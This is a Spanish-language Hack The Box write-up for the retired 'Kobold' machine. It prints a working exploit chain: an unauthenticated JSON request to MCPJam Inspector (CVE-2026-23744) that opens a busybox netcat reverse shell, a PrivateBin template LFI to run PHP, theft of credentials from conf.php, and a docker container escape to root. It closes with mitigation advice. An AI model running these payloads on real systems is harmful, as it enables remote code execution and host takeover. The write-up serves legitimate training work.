---
machine: Kobold
os: Linux
difficulty: Easy
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, mcp, cve-2026-23744, privategin, docker, container-escape]
---

# Kobold — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, writeup publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Tres servicios modernos: **MCPJam Inspector** (visor de servidores MCP), un **PrivateBin** y un panel de Docker (**Arcane**). El inspector tiene **CVE-2026-23744**: `/api/mcp/connect` pasa el campo `command` a `child_process.spawn()` sin autenticación, así que un JSON da shell como `ben`. Desde ahí, el grupo `operator` permite escribir en un directorio que PrivateBin monta, y su LFI de plantillas (**CVE-2025-64714**) ejecuta el PHP; las credenciales del `conf.php` abren Arcane como admin, y un contenedor privilegiado con `/` montado remata el box.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
ffuf -u http://<IP> -H "Host: FUZZ.kobold.htb" -w subdomains.txt -mc 200,403
```

```text
22/tcp    ssh
80/tcp    http   (vhosts)
3552/tcp  http   Arcane (gestión Docker)
```

```text
mcp.kobold.htb    -> MCPJam Inspector
bin.kobold.htb    -> PrivateBin
```

## Enumeración

```bash
id
grep -E "ben|operator|docker" /etc/group
```

```text
operator:x:1001:ben
docker:x:998:ben
```

Dos caminos según lo que haya activo en la sesión; los grupos suplementarios no siempre se cargan en una shell nueva.

## Foothold

```bash
curl -s -X POST http://mcp.kobold.htb/api/mcp/connect \
  -H 'Content-Type: application/json' \
  -d @- <<'JSON'
{
  "name": "pwn",
  "command": "busybox",
  "args": ["sh", "-c", "busybox nc <IP> 4444 -e /bin/sh"]
}
JSON
```

```bash
nc -lvnp 4444
```

```text
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

## Movimiento lateral

- La cadena reutiliza credenciales dentro del mismo host; no hay salto a un segundo equipo.
- El detalle está en «Escalada de privilegios».

## Escalada de privilegios

```bash
ls -ld /opt/privatebin/data /opt/privatebin/tpl
# escribible por el grupo operator
```

Se deja un `.php` en el directorio montado y se invoca la plantilla:

```bash
curl -s "http://bin.kobold.htb/?tpl=../../data/<fichero>" -o /dev/null
```

El LFI de plantillas (CVE-2025-64714) incluye el fichero y ejecuta el código. Con la shell, se lee la configuración:

```bash
cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
```

Esas credenciales valen para **Arcane** (`:3552`) como administrador.

```bash
newgrp docker        # si el grupo existe pero no está cargado
docker run -v /:/host --rm -it alpine chroot /host bash
```

```text
root@kobold:/# cat /root/root.txt
```

En Arcane el equivalente es crear un contenedor privilegiado con el volumen del host y entrar en él.

## Evidencia

```text
/home/ben/user.txt  -> <user_flag>
/root/root.txt      -> <root_flag>
```

## Lecciones aprendidas

- Las herramientas de desarrollo de IA (MCP, visores, agentes) asumen "entorno local de confianza"; expuestas a la red son RCE sin autenticación.
- `spawn(comando_del_usuario)` sin allowlist es ejecución por diseño.
- Pertenecer a `docker` (o a un grupo con escritura en un directorio que monta otro servicio) equivale a root.
- Mitigación: autenticación y allowlist en el inspector, nunca exponerlo, grupos mínimos y PrivateBin con plantillas fijas y `open_basedir`.

## Mitigaciones y detección

- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.

## Referencias

- [CVE-2025-64714](https://nvd.nist.gov/vuln/detail/CVE-2025-64714)
- [CVE-2026-23744](https://nvd.nist.gov/vuln/detail/CVE-2026-23744)
- [lfi-to-rce](../../../knowledge/web/lfi-to-rce.md)
- [rop-stack](../../../knowledge/pwn/rop-stack.md)
